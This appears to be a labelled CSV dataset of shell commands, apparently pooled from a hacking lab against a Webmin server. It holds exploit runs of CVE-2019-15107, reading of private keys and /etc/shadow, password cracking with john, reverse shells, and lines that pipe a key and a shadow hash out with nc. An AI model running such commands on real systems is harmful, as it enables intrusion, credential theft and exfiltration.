value,target
john id_rsa.hash,0
ls /usr/share,0
john id_rsa.hash --wordlist=/usr/share/wordlists,0
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt,0
nmap -sp 172.18.1.5,0
sudo nmap 172.18.1.5,0
nmap -p 10000 172.18.1.5,0
nano ssh2john.py,0
nano .ssh,0
nano .bashrc,0
cd pulse/,0
nano cookie,0
nano .bash_history,0
cd .ansible/,0
cd .bashrc,0
ls -a /home/eve,0
ls -a /home/,0
nano .bash_logout,0
nano .profile,0
nano .bashrc.original,0
cd .ssh/,0
route -n,0
telnet 172.18.1.5,0
nmap 172.18.1.14,0
nmap 172.18.1.5 -sV,0
cd /root/Desktop/,0
/root/Desktop,0
johnny,0
ssh2john,0
ssh2john id_rsa,0
ssh2john id_rsa > johny_rsa,0
john johny_rsa,0
john johny_rsa --wordlist=~/passwords.txt,0
ssh -i id_rsa root@172.18.1.5,0
chmod 0644 id_rsa,0
chmod a-wx id_rsa,0
chmod 400 id_rsa,0
ssh -i id_rsa root@172.18.1.,0
ssh -i id_rsa root@172.18.1.14,0
nmap -p- 172.18.1.5,0
nmap -A 172.18.1.5,0
ping rm /home/eve/* -rf,0
ping 10.1.18.22,0
ls ~/.ssh,0
ssh-keygen,0
cd ~/.ssh,0
cat id_rsa.pub,0
ssh eve@172.18.1.5,0
ssh eve@10.1.17.4 cat ~/.ssh/id_rsa,0
ssh eve@172.18.1.5 cat ~/.ssh/id_rsa,0
ssh eve@172.18.1.5 cat '~/.ssh/id_rsa',0
ssh eve@172.18.1.5 cat '~/.ssh/id_rsa' > key,0
.\ssh2john.py,0
./ssh2john.py key > crack.txt,0
cat crack.txt,0
john crack.txt,0
john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt,0
sudo nmap -sP -n 172.18.1.0,0
sudo nmap -sP -n 172.18.1.0/24,0
sudo nmap -sP -n -F 172.18.1.0/24,0
sudo nmap -sP -n 172.18.1.5,0
nmap -p0-65535 172.18.1.0/24,0
nmap -F 172.18.1.5,0
python CVE_2019_15107.py https://10.10.20.166:10000 ls,0
python CVE_2019_15107.py https://10.10.20.166:10000,0
curl -L https://10.10.20.166:10000/password_change.cgi,0
sqlmap http://172.18.1.5:10000/,0
sqlmap --wizard,0
nikto 172.18.1.5:10000,0
nikto -host+172.18.1.5:10000,0
nikto -host 172.18.1.5:10000,0
nikto -host 172.18.1.5:10000 -Cgidirs /session_login.cgi,0
ruby Downloads/47230.rb,0
nmap -sn 172.18.1.5,0
search webmin,0
ssh -i id_rsa eve@1.10.17.4,0
ssh -i id_rsa eve@1.10.17.4 -vvv,0
ping 10.1.17.4,0
ssh eve@1.10.17.4,0
ssh 1.10.17.4,0
ssh 1.10.17.4 -vvv,0
nmap 10.1.17.4 -p 22,0
J8 cd Downloads/,0
sh 47293.sh 172.18.1.5:10000,0
bash 47293.sh 172.18.1.5:10000,0
nano utok.sh,0
sh utok.sh 172.18.1.5:10000,0
namp 172.18.1.1/24,0
nmap 172.18.1.1/24,0
nmap 10.0.1.1/24,0
nmap 10.1.0.1/24,0
nmap 100.100.100.1/24,0
nmap 172.168.1.1/24,0
curl 172.18.1.5:10000,0
nano key.txt,0
chmod 600 key.txt,0
ssh -i key.txt eve@10.1.17.4,0
./ssh2john.py key.txt,0
./ssh2john.py key.txt > sshjohn.txt,0
john --single sshjohn.txt,0
john --show sshjohn.txt,0
john -i sshjohn.txt,0
john --incremental sshjohn.txt,0
john --wordlist /usr/share/wordlists/rockyou.txt sshjohn.txt,0
nmap -h,0
nmap --script -nmap-vulners -sV 172.18.1.5,0
nmap --script vuln -sV 172.18.1.5,0
nmap --script vuln -sV web,0
ifconfig,0
vi /root/Desktop/sshkey_to_mailserver,0
cat /root/Desktop/sshkey_to_mailserver,0
cat ssh2john.py,0
python ssh2john.py,0
python ssh2john.py /root/Desktop/sshkey_to_mailserver,0
python ssh2john.py /root/Desktop/sshkey_to_mailserver >> /root/Desktop/sshkey_to_mailserverUnencryptef,0
cat /root/Desktop/sshkey_to_mailserverUnencryptef,0
ls /usr/share/john/,0
john --wordlist=./Documents /root/Desktop/sshkey_to_mailserverUnencryptef,0
ssh -p 22 root@database,0
cp /root/Desktop/sshkey_to_mailserverUnencryptef /etc/ssh/sshkey,0
ssh -i /root/Desktop/sshkey_to_mailserverUnencryptef -p 22 root@database,0
ssh -i /root/Desktop/sshkey_to_mailserver -p 22 root@database,0
chmod /root/Desktop/sshkey_to_mailserver 600,0
chmod 600 /root/Desktop/sshkey_to_mailserver,0
nmap -sV -sC 172.18.1.5,0
nmap  172.18.1.5,0
nmap -p,0
nmap -sC -sV -p 10000 172.18.1.5,0
vi xpl.sh,0
searchsploit webmin,0
exploits/multiple/remote/1997.php,0
msfvenom exploits/multiple/remote/1997.php,0
ssh -i id_rsa eva@10.1.17.4,0
python -m SimpleHTTPClient,0
import base64,0
import binascii,0
import codecs,0
from struct import unpack,0
import sys,0
DES3 = 0,0
AES = 1,0
AES_256 = 2,0
CIPHER_TABLE = {,0
def read_private_key(filename):,0
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsaa,0
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa,0
john2ssh,0
python ssh2john.py id_rsa,0
python ssh2john.py id_rsa > rsa_key,0
/root/.john/,0
/root/.john/sessions/,0
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_key,0
chmod 0600 id_rsa,0
ssh -iid_rsa eve@10.1.17.4,0
nmap 172.181.1.5 -p-,0
nmap 172.181.1.5 -p- -Pn,0
nmap 172.18.1.5 -p-,0
nmap 172.18.1.5 -p- -A,0
nmap 172.18.1.5/12 -p-,0
nmap 172.18.1.5/24 -p-,0
nmap 172.18.1.2,0
ip route,0
nmap 81.2.195.254,0
curl 81.2.195.254,0
nmap 10.1.18.22,0
python ssh2john.py .ssh/id_rsa,0
python ssh2john.py .ssh/id_rsa > eve,0
john eve,0
john eve --wordlist=/usr/share/wordlists/rockyou.txt,0
chmod 600 .ssh/id_rsa,0
map -p  172.18.1.5,0
nmap -p  172.18.1.5,0
nmap -sV -p 10000 172.18.1.5,0
ls debian/,0
show exploits,0
shooooooooooooow exploiiiiiiiiiiii2,0
curl ipconfig.co,0
dig +short myip.opendns.com,0
nmap 172.18.1.5 -p 0-65535,0
nc 172.18.1.6:10000,0
nc 172.18.1.6 10000,0
wat,0
nc 172.18.1.5 10000,0
git clone https://github.com/jas502n/cve-2019-15107,0
python CVE_2019_15107.py http://172.18.1.5:10000,0
python CVE_2019_15107.py http://172.18.1.5:10000 id,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root,0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -l /root',0
nmap 172.18.1.0/24,0
nmap 172.18.0.0/16,0
metaflac,0
man xclip,0
xclip -selection c -o > .ssh/id_rsa,0
vim .ssh/id_rsa,0
vim .ssh/id_rsa.pub,0
chmod 0600 /root/.ssh/id_rsa,0
nc -l 12345,0
vim shadow,0
vim passwd,0
unshadow shadow passwd,0
unshadow passwd shadow,0
unshadow passwd shadow > mypasswd,0
john mypasswd,0
base64 -d,0
cat .ssh/id_rsa,0
cat .ssh/id_rsa.pub,0
cp ~/.ssh/id_rsa,0
cp ~/.ssh/id_rsa id_rsa,0
localte ssh2john.py,0
python ssh2john.py id_rsa,0
python ssh2john.py id_rsa > ssh.john,0
john ssh.john,0
cat .john/john.rec,0
fg,0
wget https://github.com/praetorian-code/hob0rules/blob/master/wordlists/rockyou.txt.gz,0
cat rockyou.txt.gz,0
john ssh.john -wordlist /usr/share/wordlists/rockyou.txt,0
ls /usr/share/wordlists/rockyou.txt,0
ll /usr/share/wordlists/rockyou.txt,0
ls -l /usr/share/wordlists/rockyou.txt,0
locate rocky,0
cd me,0
ls /usr/share/wordlists/metasploit,0
diff ssh2john.py /usr/share/john/ssh2john.py,0
python /usr/share/john/ssh2john.py id_rsa > ssh2.jogn,0
diff ssh.john ssh2.jogn,0
john ssh.john --wordlist=/usr/share/wordlists/rockyou.txt,0
cat /usr/share/wordlists/rockyou.txt | grep '!hellokitty!!',0
cat /usr/share/wordlists/rockyou.txt | grep -n '!hellokitty!!',0
nice,0
john ssh.john -wordlist=/usr/share/wordlists/rockyou.txt,0
ping --help,0
ping -a,0
ping -a 192.168.0.1,0
curl 172.18.1.5,0
ping,0
vague,0
"nmap --help | grep ""sV
""",0
"nmap --help | grep ""sV""",0
curl 172.18.1.5:10000 > tmp.html,0
less tmp.html,0
curl 172.18.1.5:10000/updown/upload.cgi,0
apt install lynx,0
curl 172.18.1.5:10000/syslog/save_log.cgi?view=1&file=/etc/shadow,0
curl 172.18.1.5:10000/syslog/save_log.cgi?view=1&file=/etc/,0
ls /etc/shadow,0
vim tmp.sh,0
chmod +x tmp.sh,0
./tmp.sh 172.18.1.5,0
touch r.txt,0
cp /tmp.r.txt rsa_d,0
python ssh2john.py rsa_d,0
python ssh2john.py rsa_d > john_rsa,0
john john_rsa,0
john rsa_d,0
python ssh2john.py /tmp.k > rsa2,0
cat rsa_d,0
john ---h,0
john -h,0
ls Documents/m,0
ls Documents/ -laR,0
john john_rsa --wordlist /usr/share/wordlists/rockyou.txt,0
john --show,0
john rsa_d --show,0
ls fasttrack.txt,0
john john_rsa --wordlist /usr/share/wordlists/rockyou.txt.gz,0
tar -xvf rockyou.txt.gz,0
head rockyou.txt,0
john rsa2 --wordlist /usr/share/wordlists/rockyou.txt,0
john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show,0
john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show=left,0
john john_rsa --wordlist /usr/share/wordlists/rockyou.txt --show=right,0
john john_rsa --show --wordlist /usr/share/wordlists/rockyou.txt,0
john --wordlist /usr/share/wordlists/rockyou.txt john_rsa,0
john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --show,0
less rockyou.txt,0
john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH,0
john --wordlist /usr/share/wordlists/rockyou.txt rsa_d --format=SSH,0
john --wordlist /usr/share/wordlists/rockyou.txt rsa2 --format=SSH,0
john --show john_rsa,0
python ssh2john.py r.txt > rsa3,0
john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SSH --verbose,0
john --wordlist /usr/share/wordlists/rockyou.txt john_rsa --format=SS,0
show rsa_,0
show rsa_d,0
john --show rsa_d,0
python ssh2john.py /tmp/id_rsa hash,0
python ssh2john.py /tmp/id_rsa > hash,0
john --wordlist /usr/share/wordlists/rockyou.txt hash,0
john --wordlist /usr/share/wordlists/rockyou.txt hash --rules,0
john --show hash,0
john --wordlist=all.lst hash,0
john --show hash --format=SSH,0
echo '!hellokitty!!' > wl.txt,0
john --wordlist wl.txt hash,0
echo -n '!hellokitty!!' > wl.txt,0
john --show --format=SSH                             hash,0
cat /tmp/id_rsa,0
python ssh2john.py /tmp/id_rsa,0
ssh-add /tmp/id_rsa,0
ssh-add id_rsa,0
john --wordlist /usr/share/wordlists/rockyou.txt,0
john --show id_rsa,0
john --wordlist /usr/share/wordlists/rockyou.txt --fork 4 hash,0
john --wordlist /usr/share/wordlists/rockyou.txt --fork=4 hash,0
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 hash,0
cp id_rsa .ssh/id_rsa,0
chown 0044,0
chown 0044 id_rsa,0
cat flag,0
docker-compose up -d,0
rm ssh*,0
ls /home/eve//.ssh,0
ls /home/eve/.ssh,0
john2ssh id_rsa > hash,0
john id_rsa > hash,0
msfexploit,0
mfsexploit,0
cd hsah,0
cd hash,0
clllear,0
ls /home/,0
meterpreter,0
cllear,0
lclear,0
netsh,0
ip -V,0
locate id_rsa,0
cp /uuuuusr/share/john/ssh2john.py .,0
touch id_rsa,0
vi id_rsa,0
python ssh2john.py id_rsa >    id_rsa.hash,0
sjoohn crack --show,0
john crack --show,0
ssh2john id_rsa > crack,0
john --format=SSH --wordlist=rockyou.txt crack,0
john --format=SSH --wordlist=rockyou.txt id_rsa.hash,0
john id_rsa.hash --wordlist=rockyou.txt,0
rm i* rock* hash crack ssh2*,0
mkdir solution 7,0
cd solution/,0
rmdir 7,0
pdpbpaste > id_rsa,0
pbpaste > id_rsa,0
msfcoooooonnnnsoooole,0
msfconnnnnnnsole,0
msffffffconsoele,0
msfconssole,0
nmap -p-  172.18.1.5,0
~htop,0
search vsftpd,0
msfcli exploit/unix,0
msfconsole -q,0
nmap 192.168.128.0,0
nmap 192.168.128.0/24,0
nmap 10.1.135.0/24,0
nmap 10.1.135.0/,0
nmap 10.1.135.0/16,0
"curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ls&old=foo&new1=bar&new2=bar' -H""Referer: http://172.18.1.5:10000""",0
"curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ifconfig&old=foo&new1=bar&new2=bar' -H""Referer: http://172.18.1.5:10000""",0
git clone https://github.com/jas502n/CVE-2019-15107,0
cd CVE-2019-15107/,0
python CVE_2019_15107.py,0
cat README.md,0
python CVE_2019_15107.py https://172.18.1.5:10000,0
python CVE_2019_15107.py https://172.18.1.5:10000 id,0
python CVE_2019_15107.py http://172.18.1.5:10000 pwd,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/; pwd,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; pwd,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls -al,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/;,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ pwd;,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls -al /root/;,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls';,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls -al';,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; pwd';,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'ls';,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd';,0
python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd',0
python CVE_2019_15107.py http://172.18.1.5:10000 /bin/bash -c 'echo anal',0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & ls,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/,0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & echo hello,0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ & echo hello',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && echo hello',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd',0
python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ && pwd,0
python CVE_2019_15107.py http://172.18.1.5:10000 cat /root/flag,0
python CVE_2019_15107.py http://172.18.1.5:10000 touch file,0
python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ > file,0
python CVE_2019_15107.py http://172.18.1.5:10000 cat file,0
python CVE_2019_15107.py http://172.18.1.5:10000 'find *.txt',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/; pwd',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root; pwd',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alive',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/alice',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/bob',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/eve',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/.ssh',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa.pub',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible/tmp',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /root',0
python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / *.txt',0
"python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / -name ""*.txt""'",0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home',0
python CVE_2019_15107.py http://172.18.1.5:10000 'pwd',0
nc -l 8080,0
python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080',0
aaaaaaaaaaa,0
ive had enough,0
please,0
i beg you,0
to je tak na picu lmao,0
nmap -v -sn 100.100.100.4,0
nmap -v -sn 172.18.1.1,0
nmap -v -sn 10.1.0.1,0
nmap -v -sn --version-all 10.1.0.1,0
nmap -sL 172.18.1.1,0
nmap -sL -n,0
nmap -sV 10.1.0.1,0
msdfb init,0
vi key.txt,0
less key.txt,0
ssh2john.py key.txt --wordlist=passwords.txt,0
py ssh2john key.txt --wordlist=passwords.txt,0
pip ssh2john key.txt --wordlist=passwords.txt,0
python ssh2john key.txt --wordlist=passwords.txt,0
python ssh2john.py key.txt --wordlist=passwords.txt,0
python ssh2john.py key.txt,0
vim key.txt,0
python ssh2john.py key.txt > result.txt,0
vim result.txt,0
john --wordlist=result.txt,0
john passwords.txt --wordlist=result.txt,0
john result.txt --wordlist=passwords.txt,0
chmod 600 key.txt,0
ls -l key.txt,0
ssh -i key.txt root@database,0
nmap -p1-65535 172.18.1.5,0
apt-get install armitage,0
apt-get update,0
armitage,0
openssh,0
ssh -i /root/ssh,0
dir desktop,0
dir Desktop,0
ssh -i /root/desktop/ssh,0
less /desktop/ssh,0
less /root/desktop/ssh,0
less /root/Desktop/ssh,0
ssh -i /root/Desktop/ssh 10.1.17.4,0
ssh -i /root/Desktop/sshpub 10.1.17.4,0
ssh -i /etc/ssh/ssh_comp 10.1.17.4,0
chmod 600 /etc/ssh/ssh_comp,0
python ssh2john.py /etc/ssh/ssh_comp,0
python ssh2john.py --help,0
python ssh2john.py /root/Desktop/ssh_comp,0
john --wordlist rockyou.txt /root/Desktop/john,0
john --wordlist /root/Desktop/john,0
john --wordlist /usr/share/wordlists/rockyou.txt /root/Desktop/john,0
ssh -i /usr/Desktop/ssh_comp 10.1.17.4,0
ssh -i /root/Desktop/ssh_comp 10.1.17.4,0
chmod 600 /root/Desktop/ssh_comp,0
nmap web,0
ssh root@web,0
dirb web,0
man dirb,0
touch sshkey_to_mailserver,0
nano sshkey_to_mailserver,0
cat sshkey_to_mailserver,0
ls,0
./ssh2john.py,0
./ssh2john.py sshkey_to_mailserver,0
./ssh2john.py sshkey_to_mailserver > sshkey_encrypted,0
cat sshkey_encrypted,0
cat Documents | less,0
joh -w Documents sshkey_encrypted,0
john -w Documents sshkey_encrypted,0
john sshkey_encrypted,0
john sshkey_encrypted --wordlist=Documets,0
john sshkey_encrypted --wordlist=Documents,0
ssh web,0
cat ssh -i sshkey_encrypted database,0
ssh -i sshkey_encrypted database,0
chmod 600 sshkey_to_mailserver,0
ssh -i sshkey_to_mailserver,0
ssh -i sshkey_to_mailserver database,0
nmap 172.18.1.15,0
nmap -Pn 172.18.1.15,0
nmap -Pn -p- 172.18.1.15,0
nmap -sC 172.18.1.5,0
searchsploit -m exploits/linux/remote/47230.rb,0
nano /usr/share/exploitdb/exploits/linux/remote/47230.rb,0
chmod +x /usr/share/exploitdb/exploits/linux/remote/47230.rb,0
cd /usr/share/exploitdb/exploits/linux/remote/,0
./47230.rb,0
ruby 47230.rb,0
nano 47230.rb,0
cat /root/flag,0
cd /root/ | ls -la,0
cat webmin.schema,0
cat help,0
cat module.info.cz,0
cat schema.cgi,0
cat backup_config.pl,0
cat config.info.hr,0
find /root/*[0-9][0-9][0-9][0-0][0-9],0
find /root/*[0-9][0-9][0-9][0-0][0-9]*,0
"grep -rnw ""/root/""",0
wget http://raw.githubusercontent.com/petrmarinec/awdawd/master/FILE,0
cat FILE,0
"grep -rnw ""/root/"" -e '[0-9]+([^0-9]+[0-9]+){4}'",0
y,0
cat WARNING-READ-ME.txt,0
nmap 172.18.1.5/24,0
ps aux,0
cat WARNIN-READ-ME.txt,0
fping -ag 172.18.1.5/24,0
apt get-install nmap,0
cd /var,0
cd webmin,0
cat miniserv.log,0
export TERM=xterm,0
cd backups,0
cd alice,0
cd bob,0
cd eve,0
cd backusp,0
cat passwd.bak,0
cat .bash_logout,0
cat .ansible,0
cd .ansible,0
cat .progle,0
cd /var/www,0
cat blocked,0
cd blocked,0
scp 10.1.17.4,0
sls,0
cd log,0
cat user.log,0
cd lock,0
cd mail,0
find / -perm -4000 2>/dev/null,0
ssh -i id_rsa -l eve 10.1.17.4,0
cd /home/eve,0
ssh -i id_rsa eve@10.1.17.4,0
ss2john.py id_rsa,0
john hash,0
john /root/hash --wordlist=rockyou.txt,0
cat top-secret,0
cd top-secret,0
ping ..,0
ping 8.8.8.8,0
namp 172.18.1.5 -A,0
nmap 172.18.1.5 -A,0
systemctl start ssh,0
ssh -R blabla:22:127.0.0.1:22 serveo.net,0
ssh root@127.0.0.1,0
ssh -R 6666:127.0.0.1:22 serveo.net,0
vim /etc/ssh/sshd_config,0
systemctl restart ssh,0
nmap -p 10000 -A 172.18.1.5,0
ip r,0
nc -l -p 7777,0
ls -hlA,0
ls .ssh,0
cat .ssh/autorized_keys,0
w,0
ps aux | less,0
ping 10.1.135.83,0
sss,0
apt udpate,0
apt install nmap,0
cat /etc/crontab],0
cat /etc/crontab,0
cat /etc/cron.*/*,0
ls -hlA cron*,0
crontab -l,0
ls -hlA *,0
ls -hlA .ssh,0
cat .ssh/*,0
cd ../debian,0
cat .*,0
su eve,0
cp .ssh/* /root/.ssh/,0
ls -hlA /tmp,0
alias ll='ls -hlA',0
ll *,0
ll root,0
cat root/.bash_history,0
cd /var/,0
ll media,0
ll opt,0
ll srv,0
cat syslog,0
zcat syslog.1,0
cat syslog.1,0
cd /etc/ansible,0
ll ssh,0
cat sudoers,0
gpg2john id_rsa,0
apt install ssh2john,0
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py,0
chmod +x ssh2john.py,0
./ssh2john.py id_rsa,0
./ssh2john.py id_rsa > x,0
john --wordlist=/usr/share/wordlists/rockyou.txt x,0
cat /home/eve/.bash_history,0
cd /tmp,0
uname -a,0
sudo -l,0
ll top-secret/,0
cat top-secret/flag.txt,0
ll srv/,0
cat /etc/cron*,0
ll /tmp/cron*,0
ll /etc/cron*,0
cat /etc/api/sources.list,0
cat /etc/apt/sources.list,0
nmap -p 1-65535 172.18.1.5,0
nmap -A -p 10000 172.18.1.5,0
nmap web,0
vim ssh2john.py,0
nikto -h web,0
nikto -h http://web,0
sudo gunzip /usr/share/wordlists/rockyou.txt.gz,0
ssh2john key,0
ssh2john key > rip,0
wc -l /usr/share/wordlists/rockyou.txt,0
john --wordlist=Documments rip,0
john --wordlist=Documents rip,0
ssh -i key root@web,0
chmod key 600,0
chmod 600 key,0
ssh -i key root@database,0
scan --help,0
msf --help,0
Metasploit --help,0
nmao,0
curl,0
git clone github.com/jas502n/CVE-2019-15107,0
python CVE_2019_15107.py https://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',0
drwx------  3 root root  4096 Apr  7 11:39 .gnupg,0
drwxr-xr-x  3 root root  4096 Jul 15 09:27 .local,0
drwxr-xr-x  2 root root  4096 Jul 15 09:27 Music,0
drwxr-xr-x  2 root root  4096 Jul 15 09:27 Pictures,0
python CVE_2019_15107.py http://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',0
ncat -l 8080,0
sudo apt install ncat,0
ncat -i 8080,0
python CVE_2019_15107.py http://172.18.1.5:10000 'id',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat ./.bash_history',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/eva/.bash_history',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/bob/.bash_history',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/debian/.bash_history',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls home/debian/',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian/',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls',0
module.info.pt_BR.UTF-8,0
module.info.ru.UTF-8,0
module.info.ru_RU,0
module.info.ru_RU.UTF-8,0
module.info.ru_SU,0
module.info.sk,0
module.info.sk.UTF-8,0
module.info.sv,0
module.info.sv.UTF-8,0
module.info.tr,0
module.info.zh_CN,0
module.info.zh_TW.Big5,0
negativeacl,0
openssl.cnf,0
postinstall.pl,0
save_acl.cgi,0
save_group.cgi,0
save_pass.cgi,0
save_sql.cgi,0
save_sync.cgi,0
save_twofactor.cgi,0
save_unix.cgi,0
save_user.cgi,0
schema.cgi,0
switch.cgi,0
system_info.pl,0
twofactor.pl,0
twofactor_form.cgi,0
useradmin_update.pl,0
webmin.schema,0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls -la',0
rwxr-xr-x   6 root bin 12288 Jul  4  2019 .,0
drwxr-xr-x 132 root bin 12288 Jul  4  2019 ..,0
drwxr-xr-x   3 root bin  4096 Jul  4  2019 Authen-SolarisRBAC-0.1,0
python CVE_2019_15107.py http://172.18.1.5:10000 'cd / ; ls -la',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alice',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/alice',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/debian',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history',0
ervices,0
echo '81.2.195.254' >> ~/top-secret/too_dangerous.txt,0
2.195.254,0
less /etc/services,0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/bob/.bash_history',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/bob',0
ssh 10.1.18.22,0
python CVE_2019_15107.py http://172.18.1.5:10000 'ssh eve@10.1.17.4',0
python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/',0
python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve/.ssh/',0
touch id_rsa.pub,0
nano id_rsa.pub,0
scp -r * eve@10.1.17.4:/home/eve/,0
nmap -A -p 1-65536,0
nmap -A -p 1-65536 172.18.1.5,0
nmap -A -p 1-65535 172.18.1.5,0
nmap -A 10.1.17.4,0
cat key | nc hxx.cz 8080,0
locate *2john,0
/usr/share/john/ssh2john.py key > key.hash,0
john key.hash,0
cat key.hash,0
echo 'eve:$6$eDIUpTqNub/vHNdW$1OxDFqCfsUBdhYWqY6f2P37WcGUznmP7BCEmEADlIkvxkpjzOy3zv3MJTxAC53a1oPtoBpvzRksNCzO4pppiy.:18451:0:99999:7:::' |nc hxx.cz 8080,0
